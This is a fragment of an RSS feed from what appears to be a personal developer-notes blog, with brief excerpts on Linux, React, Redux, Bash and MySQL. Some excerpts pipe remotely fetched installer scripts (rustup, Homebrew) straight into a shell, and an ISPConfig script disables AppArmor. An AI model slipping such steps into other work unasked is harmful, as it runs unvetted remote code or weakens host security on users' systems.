      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/configuring-wifi-via-command-line/</guid>
      <description>Configuring WIFI via Command Line The RaspberryPi Wireless WiFi Dongle Configuration guide by Farnell is THE BEST i’ve found so far.
To check if your wifi dongle is recognized ifconfig  if you see wlan0, it confirms that raspberry pi has detected your wifi adaptor.
To scan for wifi networks sudo iwlist wlan0 scan  Edit the wpa_supplicant.conf file sudo nano /etc/wpa_supplicant/wpa_supplicant.conf  Add the following with your network details at the end of the file, below update_config=1.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_linux/finding-files-in-linux/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/finding-files-in-linux/</guid>
      <description>Finding Files in Linux Locate Check if locate is installed which locate  If it is installed, it&amp;rsquo;ll give you the path /usr/bin/locate
Install Locate yum install locate  OR
apt-get install locate  Update Database The locate command uses a database of file names and locations. That database is updated frequently via a system cron job.
sudo updatedb  Find Find is verstile and powerful. We can search files based of the permissions a file has.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_linux/raspberry-pi-on-a-battery/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/raspberry-pi-on-a-battery/</guid>
      <description>Raspberry Pi on a battery https://www.youtube.com/watch?v=5Lw2bFTro58 8x GP2700 rechargeable AA batteries. It&amp;rsquo;s powering a Raspberry Pi model A+. In this test it lasted approximately 44 hrs 45 minutes.
https://www.youtube.com/watch?v=6Wj7bu3MkI8 14hr30min</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_linux/run-jnlp-files/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/run-jnlp-files/</guid>
      <description> Run JNLP Files on Ubuntu sudo apt install icedtea-netx icedtea-plugin -y  icedtea-netx requires openjdk-8-jre and openjdk-8-jre-headless as dependencies so it&amp;rsquo;ll install JRE (Java Runtime Environment) for you as well if you don&amp;rsquo;t have that already.
 JNLP is Java Network Launching Protocol icdeatea-netx is Netx implementation of JNLP icedtea-plugin is web browser plugin to execute Java applets  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_linux/samba/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/samba/</guid>
      <description>Setting up shared network between Ubuntu and Mac using Samba Ubuntu 16.04 LTS
Set a password for your user in Samba sudo smbpasswd -a &amp;lt;username&amp;gt;  Share a folder Right click on folder &amp;gt; Properties &amp;gt; Share this folder
Now on Mac, Cmd+K, enter smb://yourIPwhatever, enter your username and password, and mount any of the folders you shared. You can share whole partitions or drives if you want.
That&amp;rsquo;s it.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_linux/setting-up-cam-on-raspi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/setting-up-cam-on-raspi/</guid>
      <description>Setting up cam on Raspi You have two options:
- [motion](http://www.lavrsen.dk/foswiki/bin/view/Motion/WebHome) - [kerberos](https://kerberos.io/)  Motion install is pretty much all commmand line based.
Kerberos is more user friendly, easier to install and has a modern interface
Install motion sudo apt-get install motion -y  Config sudo nano /etc/motion/motion.conf  The following settings should do. Frame settings (width, height, framerate) and ports (webcam_port, control_port) are optional. The most important are the two on/off settings for daemon and webcam_localhost</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_misc/2014-08-26-about-this-site/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_misc/2014-08-26-about-this-site/</guid>
      <description> Upcoming Features  Search AJAX search Pagination Previous/Next article buttons x Comments RSS feed Comments Categories and tags  Search  ajaxified, something like mailchimp search is perfect. Mat Hayward - Jekyll search with JSON Super Easy Search For Jekyll Powered Sites  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_programming/closures/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_programming/closures/</guid>
      <description></description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/axios/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/axios/</guid>
      <description> Axios Axios is a library that handles HTTP requests really well.
Read More  Github: Axios npm: Axios How to Use Axios as Your HTTP Client  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/component-styles/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/component-styles/</guid>
      <description>Components  ES5 createClass Component ES6 Class Components ES5 Stateless Component ES6 Stateless Component  ES5 createClass Component var HelloWorld = React.createClass({ render: function () { return &amp;lt;h1&amp;gt;Hello World!M/h1&amp;gt;; } });  ES6 Class Components import React, { Component } from &amp;quot;react&amp;quot;; export default class Login extends Component { render() { return ( &amp;lt;div&amp;gt; Login Form will go here &amp;lt;/div&amp;gt; ) } }   No autobind, requires explicit bind with ES6 class  // Works fine with ES5 createClass &amp;lt;div onClick={ this.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/data-props/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/data-props/</guid>
      <description>Props this.props.whatever Props is how you get data in.
this.props is an object, which can have any sort of data properties. In order to use the properties, you wrap them in { }. (In Angular it&amp;rsquo;s a duble curly brace, in React it&amp;rsquo;s just one)
&amp;lt;div&amp;gt;Hello {this.props.name}&amp;lt;/div&amp;gt;  this.props.children gets everything rendered inside a component
Setting default props You can set default prop values. So even if the user doesn&amp;rsquo;t provide a prop value, it&amp;rsquo;ll have something to use.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/data-states/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/data-states/</guid>
      <description>States To update the state, you can call this.setState passing in a new object which overwrites one or both of the email and password properties.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/getting-data-in/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/getting-data-in/</guid>
      <description> Getting data IN React simply renders components, using data from only two places: props and state.
One of the first things you learn in working with React is state. It’s pretty fundamental to React. It’s essentially data, and it could be anything!
Read More  AJAX Requests in React: How and Where to Fetch Data Loading and Using External Data in React  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/js-for-react/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/js-for-react/</guid>
      <description> JS for React React is just JavaScript. If you&amp;rsquo;re getting frustrated with React, it&amp;rsquo;s probably because your JS knowledge is lacking. For example .map() is very good for generating HTML lists in React. But if you don&amp;rsquo;t know the JS .map() method, you&amp;rsquo;ll wonder what happened.
 .map() .bind(this)  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/jsx-file-extension/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/jsx-file-extension/</guid>
      <description> Using .jsx file extensions When using .jsx file extension, you need to specify the extension in file imports as well. For example:
import App from &#39;./components/App.jsx&#39;  When using .js file extension, it just knows it&amp;rsquo;s javascript and imports look a bit neater, like so:
import App from &#39;./components/App&#39;  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/react-router/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/react-router/</guid>
      <description>React-Router Programmatic Navigation  go to a link  // if using react-router (v2+) import { browserHistory } from &#39;react-router&#39; browserHistory.push(&#39;/some/path&#39;) // if using newer react-router API inside components (v3+) this.props.history.push(&#39;/some/path&#39;) // if using react-router-redux import { push } from &#39;react-router-redux&#39; this.props.dispatch(push(&#39;/some/path&#39;))   go to a link on button click  &amp;lt;button onClick={() =&amp;gt; browserHistory.push(&#39;my/link/&#39;)} &amp;gt; Let&#39;s go! &amp;lt;/button&amp;gt;   got to a link and send URL params, query, state whatever along  &amp;lt;button onClick={() =&amp;gt; browserHistory.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/react-intro/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/react-intro/</guid>
      <description>Intro to React Ecosystem Imperative (How) vs. Declarative (What) Imperative = how to do something, specific instructions Declarative = what to do, doing something that is somewhat already defined
Composition (Components) think in terms of components. components inside of components. breaking everything down to components. nesting components. you can create larger components composed of smaller components.
Components = aka widgets, modules
Functional composition is where you write smaller helper functions that you can use in bigger functions.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/reactrouter/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/reactrouter/</guid>
      <description>React Router ReactDOM.render(( &amp;lt;Router history={browserHistory}&amp;gt; &amp;lt;Route path=&#39;/&#39; component={Users} /&amp;gt; &amp;lt;Route path=&#39;/other&#39; component={Other} /&amp;gt; &amp;lt;/Router&amp;gt; ), document.getElementById(&#39;root&#39;))  history is required.
What we did above is we mounted a Router to the DOM, it is now going to take Routes. A route takes a path (URL) and shows a component on that path.
Link If you want to navigate anywhere within the site, you use Link. You&amp;rsquo;ll only use actual href when you want to move away from the site.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/webpack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/webpack/</guid>
      <description>Webpack Webpack is hard. Partially because it&amp;rsquo;s an extremely powerful tool and partially because the documentation is terrible. But if you have experience with tools like Grunt or Gulp, and have converted SASS files, it makes sense.
Webpack at it&amp;rsquo;s core is a code bundler. It takes your code, transforms and bundles it, then returns a brand new version of your code.
Where Webpack really shines is you&amp;rsquo;re able to tell it every transformation your code needs to make, and it will do them and output a bundle file for you full of those changes (and some other helpful things as well like minification if you desire).</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/input-fields/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/input-fields/</guid>
      <description>Input Fields Here&amp;rsquo;s the template of our React component
import React from &#39;react&#39; import ReactDOM from &#39;react-dom&#39; class MyComponet extends React.Component { constructor (props) { super(props) this.state = {} } // stuff goes here } ReactDOM.render( &amp;lt;MyComponent /&amp;gt;, document.querySelector(&#39;#root&#39;) )  You can get the value of any input field with e.target.value
handleChange (e) { console.info(e.target.value) } render () { return ( &amp;lt;input type=&#39;text&#39; onChange(this.handleChange)/&amp;gt; ) }  Once you have the value, you can update React state with this.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/react-router-push-link/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/react-router-push-link/</guid>
      <description>how to programmatically change the link, when enter is pressed, and pass a quaery param
using this.context.router.push</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_reactjs/this-and-bind/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_reactjs/this-and-bind/</guid>
      <description>this, .bind() Binding  Implicit Binding Explicit Binding (call, apply, bind) new Binding window Binding  Explicit Binding .apply() is the same as .call(), the only difference being you can pass an array of args instead of passing args one by one.
.bind() is like .call(), but it let&amp;rsquo;s you create a new function and invoke it later. .call() and .apply() are called/invoked immediately.
new Binding What&amp;rsquo;s used in constructor functions.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_redux/middleware/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_redux/middleware/</guid>
      <description>Middleware middlewares intercept actions, modify them, or cancel them by not calling any of the next middleware.
Basically, middleware happens between dispatching an action, and the moment it reaches the reducer.
// Create a middleware // Logger const logger = store =&amp;gt; next =&amp;gt; action =&amp;gt; { console.log(&#39;action fired&#39;, action) next(action) } // Apply middleware const middleware = applyMiddleware(logger) // create the store, pass it the middleware along with reducers and state const store = createStore(reducer, 1, middleware)  You&amp;rsquo;re probably never gonna create middleware, you&amp;rsquo;ll just npm install them.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_redux/object.assign-and-object-spread-operator/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_redux/object.assign-and-object-spread-operator/</guid>
      <description> Object.assign() vs Object spread operator You can use ...state, action instead of Object.assign({}, state, action)
Will need a separate Babel plugin to work.
npm i -D babel-plugin-syntax-object-rest-spread babel-plugin-transform-object-rest-spread  once installed, add the plugins to .babelrc
&amp;quot;plugins&amp;quot;: [ &amp;quot;syntax-object-rest-spread&amp;quot;, &amp;quot;transform-object-rest-spread&amp;quot; ]  Links  Redux Docs:   </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_redux/redux-intro/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_redux/redux-intro/</guid>
      <description>Redux  Single state tree Actions describe updates Reducers apply updates   Everything that happens in your app is an action. These can be caused by users, browser events, or server events. Doesn’t matter. Everything that changes something in your app does it via an “action”.
 You have one giant state object that represents all the state in your app. These are not special Models, or Collections, it’s just friggin’ objects, arrays, and primitives.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_redux/troubleshooting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_redux/troubleshooting/</guid>
      <description> Troubleshooting Redux State is not updating  Make sure you are not mutating your state in any of the reducers  Actions not dispatching  Make sure you&amp;rsquo;re adding this.props before the action you want to dispatch.  State is not showing  This happens when you  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_redux/general-react-redux-flow/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_redux/general-react-redux-flow/</guid>
      <description>General React-Redux Flow  Create actions and reducers Connect the app to store with Provider Create a container  mapStateToProps mapDispatchToProps connect  Using state and dispatch  connecting the store import { Provider } from &#39;react-redux ReactDOM.render( &amp;lt;Provider store={store}&amp;gt; &amp;lt;MyRootComponent /&amp;gt; &amp;lt;/Provider&amp;gt;, document.getElementById(&#39;root&#39;) )  Creating a container import React from &#39;react import { connect } from &#39;react-redux&#39; class MyClass extends React.Component {} function mapStateToProps (state, ownProps) {} function mapDispatchToProps (state, ownProps) {} export default connect(mapStateToProps, mapDispatchToProps)(MyClass)  You can pass down the whole state to the connect function, or you can map your props and actions and then connect them, it&amp;rsquo;s up to you really.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_rsc/tools-svgcleaner/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_rsc/tools-svgcleaner/</guid>
      <description>SVG Cleaner Here are the install instructions for Linux Ubuntu 16.04 LTS
For SVG Cleaner you need to install Rust compiler and Cargo. Cargo is the package manager for Rust. The packages are called crates..
install Rust compiler curl https://sh.rustup.rs -sSf | sh  it&amp;rsquo;ll ask you for installation option and then take a while (downloads 100MiB+) to install.
During installation, rustup, will attempt to configure PATH, but because of differences between platforms, command shells, and bugs in rustup, the modifications to PATH may not take effect until the console is restarted, or the user logged out, or may not succeed at all.</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_webdev/2014-08-25-an-exhibit-of-markdown/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/2014-08-25-an-exhibit-of-markdown/</guid>
      <description>&lt;p&gt;&lt;p&gt;A lead or excerpt should go here. two or three lines are good. About 320 chars is also fine.&lt;/p&gt;
&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipisicing elit. Soluta, in dolores maxime eveniet saepe libero eum consequatur, commodi enim eos ab doloremque ratione illum quaerat voluptas ipsa explicabo corrupti laborum excepturi. Adipisci, dolores, recusandae! Sit tempora dolorum, ipsum cupiditate libero.&lt;/p&gt;
&lt;/p&gt;</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_webdev/2014-08-26-dev-environment-mac/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/2014-08-26-dev-environment-mac/</guid>
      <description>#Dev Environment (Mac) How to Check the Version of a Script/Tool toolName --version
homebrew Install
ruby -e &amp;quot;$(curl -fsSL https://raw.github.com/Homebrew/homebrew/go/install)&amp;quot;  Once you’ve installed Homebrew, insert the Homebrew directory at the top of your PATH environment variable. You can do this by adding the following line at the bottom of your ~/.bashrc file
export PATH=/usr/local/bin:/usr/local/sbin:$PATH  update: brew update check outdated: brew outdated upgrade: brew upgrade upgrade specific package: brew upgrade package troubleshoot: brew doctor</description>
    </item>
    
    <item>
      <title></title>
      <link>/post/_webdev/redirect-a-site-via-.htaccess/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/redirect-a-site-via-.htaccess/</guid>
      <description> Redirect a site via .htaccess Redirect 301 / http://newsite.com  </description>
    </item>
    
    <item>
      <title></title>
      <link>/post/api/ajax/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/api/ajax/</guid>
      <description>AJAX XMLHttpRequest() const xhr = new XMLHttpRequest(); xhr.open(&#39;GET&#39;, url); xhr.onload = function() { if(xhr.status === 200) { console.log(xhr.response) } }; xhr.onerror = function() {}; xhr.send();  onReadyStateChange has been around since original spec. In v2, onload, onprogress and onerror were introduced, which are basically different states. Instead of defining a function that looks for onReadyStateChange === 4, you can use the onload function, which is more to the point and less typing.</description>
    </item>
    
    <item>
      <title>(JavaScript) Web APIs and their Interfaces</title>
      <link>/post/_webdev/javascript-web-apis-and-their-interfaces/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/javascript-web-apis-and-their-interfaces/</guid>
      <description>Web APIs JavaScript is a scripting language. In the context of a web browser, scripting usually refers to program code written in JavaScript that is executed by the browser when a page is downloaded, or in response to an event triggered by the user. 1
A Web API is an API for either a web server or web browser. There&amp;rsquo;s a lot we can do inside a browser: animate graphics, send messages, edit photos, edit files etc.</description>
    </item>
    
    <item>
      <title>AJAX Basics</title>
      <link>/post/api/ajax-basics/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/api/ajax-basics/</guid>
      <description>AJAX Concepts Programming AJAX jQuery and AJAX AJAX and APIs  AJAX Concepts Intro AJAX = Asynchronous JavaScript And XML
It lets you request info from web server, post data to a web server and update content on a web page with loading a new web page. It works with pretty much all major server side languages (PHP, JavaScript, Ruby, Python etc.).
The whole process of sending data back and forth involves the client (browser) sending a request and the server sending back a response.</description>
    </item>
    
    <item>
      <title>API Basics - Grabbing Data with Python</title>
      <link>/post/api/api-basics-grab-data-python/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/api/api-basics-grab-data-python/</guid>
      <description>This is the accompanying code file for the video Coding With Python :: Learn API Basics to Grab Data with Python.
 Check this Google Books Developer link for some code samples.
 This whole article uses ISBNdb for URL searches. Open Library is also mentioned as an API source but not used in any of the code.
  APIs:  ISBNdb Open Library Google Books API  Getting data in Terminal ISBNdb:</description>
    </item>
    
    <item>
      <title>Add SSH Key to MacOS Keychain permanently</title>
      <link>/post/_linux/2017-02-20-howto-add-ssh-key-macos-keychain-permanently/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_linux/2017-02-20-howto-add-ssh-key-macos-keychain-permanently/</guid>
      <description>Run ssh-agent if it&amp;rsquo;s not already running
eval &amp;quot;$(ssh-agent -s)&amp;quot;  Add SSH key to ssh-agent
ssh-add -K ~/.ssh/id_rsa  where id_rsa is the actual filename of the key you&amp;rsquo;re adding. This should do it for OSX before Sierra.
MacOS Sierra Create an SSH config file
nano ~/.ssh/config  Add the following to it
Host * UseKeychain yes AddKeysToAgent yes IdentityFile ~/.ssh/id_rsa   UseKeychain yes tells SSH to look in your OSX keychain for the key passphrase.</description>
    </item>
    
    <item>
      <title>Adding and Removing Nodes (HTML Elements)</title>
      <link>/post/_webdev/adding-and-removing-nodes-html-elements/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/adding-and-removing-nodes-html-elements/</guid>
      <description>Creating new nodes
 createElement() creates an HTML element createTextNode() creates a text node appendChild() appends (adds to the end) a node insertBefore() prepends a node, opposite of .appendChild() removeChild() removes a child node replaceChild() replaces a child node cloneNode() creates a copy of the node (You can clone a node before adding it for example)  Creating and adding let paragraph = document.createElement(&amp;quot;p&amp;quot;); // create a paragraph (&amp;lt;p&amp;gt; element) // to add text to the &amp;lt;p&amp;gt; element, create a text node first let node1 = document.</description>
    </item>
    
    <item>
      <title>Amazon RDS &#43; MySQL</title>
      <link>/post/_cheatsheets/cheatsheet_amazon-rds/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_cheatsheets/cheatsheet_amazon-rds/</guid>
      <description>Connect to Amazon RDS
mysql -uaamnah --password --host=mysql.hostmarkaz.com  Creating MySQL database
mysql&amp;gt; CREATE DATABASE databasename ;  Creating MySQL User
mysql&amp;gt; CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39; ;  Allowing User to Connect
// grant usage on server so the user can connect
mysql&amp;gt; GRANT USAGE ON *.* TO &#39;username&#39;@&#39;host&#39; ;  Granting Privileges
mysql&amp;gt; GRANT ALL PRIVILEGES ON databasename.* TO &#39;username&#39;@&#39;host&#39; ;  CHECK if you can connect to the created database with the user you crteated</description>
    </item>
    
    <item>
      <title>AngularJS Basics</title>
      <link>/post/_javascript/2015-04-14-basics_angularjs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_javascript/2015-04-14-basics_angularjs/</guid>
      <description>Directives HTML annotations that trigger JS behaviors   Modules Where our application components live   Controllers Where we add application behavior   Expressions How values get displayed within the page    ng-app Specifies where our app exists on the page ng-model Binds the value of the input to the variable, in both directions
{{ name }} Add dynamic content (in this case, the variable name) to our static HTML by wrapping it in double curly braces {{ }}</description>
    </item>
    
    <item>
      <title>Arguments</title>
      <link>/post/bash-scripting/arguments/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/arguments/</guid>
      <description>Arguments Arguments are keywords that are passed in the command line when executing the bash script/command.
./script.sh foo bar  $0, $1, $2 etc..  $0 is the name of the script $1 is the first argument, $2 is the second argument and so on.  Arguments passed at the time of script execution and taking user input with read oth serve the same purpose. read is a bit more safe for noobs.</description>
    </item>
    
    <item>
      <title>Asset management in Flask</title>
      <link>/post/_python/2014-09-01-asset-management-in-flask/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_python/2014-09-01-asset-management-in-flask/</guid>
      <description>tags: css and javascript optimization
How to merge, minify and compile the code of your web assets in Flask webassets is an asset management library for Python. Flask-Assets is an integration of webassets in your Flask application.
While asset management in itself is pretty neat, the best part is that you can set it to automatically merge, minify, and compile your asset files like CSS and JavaScript.
For example, if you work with Sass, you can set webassets to watch the sass file, merge multiple generated stylesheets into one and then minify it all and include that minified file in the project.</description>
    </item>
    
    <item>
      <title>Associative Arrays in Bash</title>
      <link>/post/bash-scripting/associative-arrays/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/associative-arrays/</guid>
      <description>Associative arrays are key/value pairs, like Objects in JavaScript. You can iterate/loop over them.
create (declare) an associative array This is done with the declare -A
declare -A foo # declare an array declare -A foo bar baz # declare multiple arrays declare -A myArray=( [key1]=value1 [key2]=value2 [key3]=value3 ) # Initialise all at once  add values to the array foo[key]=value  Note the lack of spaces before and after the equal = sign</description>
    </item>
    
    <item>
      <title>Attributes in DOM</title>
      <link>/post/_webdev/attributes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_webdev/attributes/</guid>
      <description> getAttribute() returns the value of a specified attribute on the element setAttribute() Sets the value of an attribute on the specified element. If the attribute already exists, the value is updated; otherwise a new attribute is added with the specified name and value removeAttribute() removes an attribute from the specified element hasAttribute()  </description>
    </item>
    
    <item>
      <title>Backing up and Restoring Databases</title>
      <link>/post/_databases/2015-02-20-backup-restore-databases/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_databases/2015-02-20-backup-restore-databases/</guid>
      <description> Export --host=&amp;quot;host&amp;quot; --user=&amp;quot;username&amp;quot; --password --port=3306 &amp;quot;db_name&amp;quot;  You can use the exported backup file to rename that database. What is the database called and what database to use is defined in the first two lines.
Rename CREATE DATABASE IF NOT EXISTS `database_wp`; USE `database_wp`;  Import --host=&amp;quot;host&amp;quot; --user=&amp;quot;username&amp;quot; --password --port=3306 --database=db_name &amp;lt; &amp;quot;path/to/backup/file.sql&amp;quot;  </description>
    </item>
    
    <item>
      <title>Backups with tar</title>
      <link>/post/_sysadmin/backups-with-tar/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/_sysadmin/backups-with-tar/</guid>
      <description>tar tar is an archiving utility, it creates and extracts (compressed) archives (aka tarballs).
tar -czpf foo.tar.gz sourceFiles file1 file2 # creates compressed archive tar -xpf foo.tar.gz # extracts archive tar -xpf foo.tar.gz -C dest/ # extracts archive in the `dest/` directory   c or --createcreates x or --extract extracts z or --gzip/--gunzip zip, compresses or uncompresses the archive with gzip p or --preserve-permissions preserves file and directory permissions f provide the File name (foo.</description>
    </item>
    
    <item>
      <title>Bash Scripting - Taking input</title>
      <link>/post/bash-scripting/2014-06-05-bash-scripting-take-input/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/2014-06-05-bash-scripting-take-input/</guid>
      <description>There are multiple ways of taking input via the Shell.
Using the &amp;lsquo;read&amp;rsquo; command to prompt for input #!/bin/bash echo &amp;quot;Enter your name:&amp;quot; read user_name echo &amp;quot;Hello $user_name!&amp;quot;  Here&amp;rsquo;s what the script will look like when we run it.
$ sh nameexample Enter your name: Sarah Hello Sarah!  Using Command-Line Arguments for Input Command line arguments given to a script become variables whose names are numbers. $1 is the first command-line argument, $2 is the second, and so on.</description>
    </item>
    
    <item>
      <title>Bash Scripting 101</title>
      <link>/post/bash-scripting/bash-scripting-101/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/bash-scripting-101/</guid>
      <description>Basics
 variables functions Loops Conditionals (If statements) taking user input check if a user is root check if a file or directory already exists colouring the output writing and redirecting data find your IP address find your hostname check if a package is already installed check if package dependencies are met how to make a link clickable exit if unmet dependencies/deps can’t be installed exit statuses (0-255, $?) $?</description>
    </item>
    
    <item>
      <title>Bash Scripts -  Load/Read/Include Settings from Another File</title>
      <link>/post/bash-scripting/load-read-settings-from-another-file-bash/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/load-read-settings-from-another-file-bash/</guid>
      <description>To include a script into another script, we use the source command. In it&amp;rsquo;s simplest form, the command is this:
source incl.sh  Here&amp;rsquo;s an example. Our keys.cfg file has this:
AWSAccessKeyId=&amp;quot;AKIAIKRGQQKRGQQKRGQQ&amp;quot; AWSSecretKey=&amp;quot;UNYDSEUNYDSEUNYDSEmwMeIdQ6KRGQQv7dBdzDSE&amp;quot;  While our script.sh has this:
#!/bin/bash #Directory the script is in (for later use) SCRIPTDIR=&amp;quot;$( cd &amp;quot;$( dirname &amp;quot;${BASH_SOURCE[0]}&amp;quot; )&amp;quot; &amp;amp;&amp;amp; pwd )&amp;quot; # Load the backup settings source &amp;quot;${SCRIPTDIR}&amp;quot;/keys.cfg  In our script.sh file we have sourced the file keys.</description>
    </item>
    
    <item>
      <title>Bash script for installing ISPConfig 3.1 on Ubuntu 17.04</title>
      <link>/post/bash-scripting/ispconfig/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/ispconfig/</guid>
      <description>source
### SYSTEM SETTINGS #################### # Check your hostname # cat /etc/hostname # cat /etc/hosts # reboot # Change the default shell dpkg-reconfigure dash # change to NO # Update repos apt update &amp;amp;&amp;amp; apt upgrade -y # Disable AppArmor sudo service apparmor stop sudo service apparmor teardown sudo update-rc.d -f apparmor remove sudo remove apparmor apparmor-utils -y # Update system time zone dpkg-reconfigure tzdata # Synchronize the System Clock apt install ntp -y ### COMPONENTS ####################### # Disable and remove Sendmail service sendmail stop; update-rc.</description>
    </item>
    
    <item>
      <title>Bash script to create Media Queries with Sass</title>
      <link>/post/bash-scripting/2014-08-30-bash-script-to-create-media-queries-with-sass/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/post/bash-scripting/2014-08-30-bash-script-to-create-media-queries-with-sass/</guid>
      <description>The following bash script will create a main sass stylesheet style.scss and then create additional sass stylesheets for all devices (mobile.scss, ipad.scss, desktop.scss, wide.scss, iphone.scss) in a folder called media-queries.
In the end, we will combine stylesheets for all devices into one by importing them into our main style.scss.
I have divided the code for different devices in their own stylesheets becuase it keeps it is neat and organized and i prefer it that way.</description>
    </item>
    
    <item>
